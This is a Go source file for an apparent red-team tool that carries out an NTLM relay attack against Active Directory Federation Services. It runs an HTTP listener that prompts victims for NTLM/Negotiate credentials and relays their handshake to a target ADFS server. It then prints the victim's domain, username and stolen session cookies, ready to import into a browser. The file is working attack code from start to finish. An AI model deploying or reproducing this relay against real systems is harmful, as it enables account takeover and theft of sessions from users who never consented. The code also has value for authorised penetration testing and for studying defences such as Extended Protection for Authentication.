// Copyright 2022 Praetorian Security, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"

	"github.com/davecgh/go-spew/spew"
	"github.com/google/uuid"
	"github.com/praetorian-in/ADFSRelay/pkg/cookies"
	"github.com/praetorian-in/ADFSRelay/pkg/ntlm"
)

var (
	targetSite string
	debug      bool
)

func ADFSRelayStateHandler(w http.ResponseWriter, r *http.Request) {

	clientRequestID := r.URL.Query().Get("client-request-id")

	MSISSamlRequest := ""
	for _, cookie := range r.Cookies() {
		if cookie.Name == "MSISSamlRequest" {
			MSISSamlRequest = cookie.Value
		}
	}

	if clientRequestID == "" {
		if MSISSamlRequest == "" {
			clientRequestID = uuid.New().String()

			MSISamlRequest, err := GetMSISAMLRequestCookie(clientRequestID)
			if err != nil {
				fmt.Printf("Error handling initial client request: %v\n", err)
				return
			}

			cookie := http.Cookie{Name: "MSISSamlRequest", Value: MSISamlRequest}
			http.SetCookie(w, &cookie)

			http.Redirect(w, r, "/?client-request-id="+url.QueryEscape(clientRequestID), http.StatusMovedPermanently)
			return
		}
	}

	authorizationHeaderValue, ok := r.Header["Authorization"]
	if !ok {
		w.Header().Add("WWW-Authenticate", "Negotiate")
		w.Header().Add("WWW-Authenticate", "NTLM")
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	authenticateHeaderValue := strings.Split(authorizationHeaderValue[0], " ")
	if len(authenticateHeaderValue) != 2 {
		fmt.Print("Error Authorization header should have two values separated by a space")
		return
	}

	if authenticateHeaderValue[0] != "Negotiate" && authenticateHeaderValue[0] != "NTLM" {
		fmt.Printf("Error Authorization header should begin with either NTLM or Negotiate")
		return
	}

	encodedMessage := authenticateHeaderValue[1]
	decodedString, err := base64.StdEncoding.DecodeString(encodedMessage)
	if err != nil {
		fmt.Println("Unable to decode base64 string, err: ", err)
		return
	}

	rawBytes := []byte(decodedString)
	ntlmMessage, err := ntlm.DecodeMessage(rawBytes)
	if err != nil {
		fmt.Println("Input is not a valid NTLM message, err: ", err)
		return
	}

	switch v := ntlmMessage.(type) {
	case *ntlm.NEGOTIATE_MESSAGE:

		if debug {
			spew.Dump(*v)
		}

		encodedChallengeMessage, err := SendNegotiateMessagetoADFS(clientRequestID, MSISSamlRequest, authorizationHeaderValue[0])
		if err != nil {
			fmt.Println("Error getting challenge message from ADFS server, err: ", err)
			return
		}

		wwwAuthenticateValues := strings.Split(encodedChallengeMessage, " ")
		if len(wwwAuthenticateValues) != 2 {
			fmt.Println("Error Www-Authenticate header should have two values separated by a space")
			return
		}

		decodedString, err := base64.StdEncoding.DecodeString(wwwAuthenticateValues[1])
		if err != nil {
			fmt.Println("Unable to decode base64 string, err: ", err)
			return
		}

		rawBytes := []byte(decodedString)
		challengeMessage, err := ntlm.DecodeMessage(rawBytes)
		if err != nil {
			fmt.Println("Input is not a valid NTLM message, err: ", err)
			return
		}

		fmt.Println("Got challenge message from the ADFS server, forwarding to the client")

		if debug {
			spew.Dump(challengeMessage)
		}

		w.Header().Add("WWW-Authenticate", encodedChallengeMessage)
		w.WriteHeader(http.StatusUnauthorized)

	case *ntlm.AUTHENTICATE_MESSAGE:

		if debug {
			spew.Dump(*v)
		}

		fmt.Println("Got an authenticate message from the client, forwarding to the ADFS server")
		returnedCookies, err := SendAuthenticateMessagetoADFS(clientRequestID, MSISSamlRequest, authorizationHeaderValue[0])
		if err != nil {
			fmt.Println("error authenticating to ADFS server, err: ", err)
		}

		for _, avPairs := range v.NtChallengeResponseFields.NTLMv2Response.ClientChallenge.AvPairs {
			if avPairs.AvId == ntlm.MsvChannelBindings {
				fmt.Println("Client included a channel binding token in the AUTHENTICATE_MESSAGE")
			}
		}

		exportedCookies := cookies.ExportCookiesToCookieEditorFormat(returnedCookies)
		jsonData, err := json.Marshal(exportedCookies)
		if err != nil {
			fmt.Println("error marshalling cookies, err: ", err)
		}

		username := string(v.UserNameFields.UserName)
		domain := string(v.DomainNameFields.DomainName)

		fmt.Printf("Successfully authenticated to ADFS as user: %s\\%s\n", domain, username)
		fmt.Println("Session Cookies:", string(jsonData))
	}
}

func SendNegotiateMessagetoADFS(clientRequestID string, MSISSamlRequest string, headerVal string) (string, error) {
	httpClient := http.Client{}

	apiUrl := targetSite + "/adfs/ls/wia?client-request-id=" + url.QueryEscape(clientRequestID)
	req, err := http.NewRequest("GET", apiUrl, nil)
	if err != nil {
		return "", fmt.Errorf("error creating ADFS POST request: %v", err)
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)")

	cookie := &http.Cookie{
		Name:  "MSISSamlRequest",
		Value: MSISSamlRequest,
	}
	req.AddCookie(cookie)

	req.Header.Add("Authorization", headerVal)
	r, err := httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("error sending ADFS POST request: %v", err)
	}

	encodedChallengeMessage, ok := r.Header["Www-Authenticate"]
	if !ok {
		return "", fmt.Errorf("missing required Www-Authenticate header")
	}

	if debug {
		fmt.Printf("Www-Authenticate header is present with value %s\n", encodedChallengeMessage[0])
	}

	split := strings.Split(encodedChallengeMessage[0], " ")
	if len(split) != 2 {
		return "", fmt.Errorf("error Www-Authenticate header should have two values separated by a space")
	}

	if split[0] != "Negotiate" && split[0] != "NTLM" {
		return "", fmt.Errorf("error Www-Authenticate header begin with either NTLM or Negotiate")
	}

	return encodedChallengeMessage[0], nil
}

func SendAuthenticateMessagetoADFS(clientRequestID string, MSISSamlRequest string, headerVal string) ([]*http.Cookie, error) {
	httpClient := http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	apiUrl := targetSite + "/adfs/ls/wia?client-request-id=" + url.QueryEscape(clientRequestID)
	req, err := http.NewRequest("GET", apiUrl, nil)
	if err != nil {
		return nil, fmt.Errorf("error creating request: %v", err)
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (MSIE 10.0; Windows NT 6.1; Trident/5.0)")

	cookie := &http.Cookie{
		Name:  "MSISSamlRequest",
		Value: MSISSamlRequest,
	}
	req.AddCookie(cookie)

	req.Header.Add("Authorization", headerVal)
	r, err := httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("error sending request: %v", err)

	}

	if r.StatusCode == 401 {
		return nil, fmt.Errorf("server returned 401 either the credentials are invalid or EPA is blocking authentication")
	}

	return r.Cookies(), nil
}

func GetMSISAMLRequestCookie(clientRequestID string) (string, error) {
	httpClient := http.Client{}

	form := url.Values{}
	form.Add("SignInIdpSite", "SignInIdpSite")
	form.Add("SignInSubmit", "Sign+in")
	form.Add("SingleSignOut", "SingleSignOut")

	apiUrl := targetSite + "/adfs/ls/idpinitiatedsignon.aspx?client-request-id=" + url.QueryEscape(clientRequestID)
	req, err := http.NewRequest("POST", apiUrl, strings.NewReader(form.Encode()))
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	if err != nil {
		return "", fmt.Errorf("error creating request: %v", err)
	}

	r, err := httpClient.Do(req)
	if err != nil {
		return "", fmt.Errorf("error sending request: %v", err)
	}

	MSISSamlRequest := ""
	for _, cookie := range r.Cookies() {
		if cookie.Name == "MSISSamlRequest" {
			MSISSamlRequest = cookie.Value
		}
	}

	if MSISSamlRequest == "" {
		return "", fmt.Errorf("expected MSISAMLRequest cookie from the server")
	}

	return MSISSamlRequest, nil
}

func main() {
	var err error

	var debugFlag bool
	var listenPortFlag int
	var targetSiteFlag string

	helpFlag := flag.Bool("help", false, "Show the help menu")

	flag.IntVar(&listenPortFlag, "port", 8080, "The port the HTTP listener should listen on")
	flag.StringVar(&targetSiteFlag, "targetSite", "", "The ADFS site to target for the relaying attack (e.g. https://sts.contoso.com)")
	flag.BoolVar(&debugFlag, "debug", false, "Enables debug output")

	if *helpFlag {
		flag.Usage()
		os.Exit(0)
	}

	flag.Parse()

	if *helpFlag {
		flag.Usage()
		return
	}

	if targetSiteFlag == "" {
		fmt.Println("The -targetSite parameter is required")
		flag.Usage()
		return
	}

	if listenPortFlag < 0 || listenPortFlag > 65535 {
		fmt.Println("Invalid listener port flag specified")
		return
	}

	listenPort := fmt.Sprintf(":%d", listenPortFlag)
	_, err = url.Parse(targetSiteFlag)
	if err != nil {
		fmt.Println("Invalid target site URL: ", err)
	}

	fmt.Println("Starting ADFS relaying targeting:", targetSiteFlag)

	targetSite = targetSiteFlag
	debug = debugFlag

	if debug {
		fmt.Println("Debug mode enabled")
	}

	http.HandleFunc("/", ADFSRelayStateHandler)
	err = http.ListenAndServe(listenPort, nil)
	if err != nil {
		fmt.Printf("error trying to listen on HTTP on port: %s, err: %v", listenPort, err)
		return
	}
}
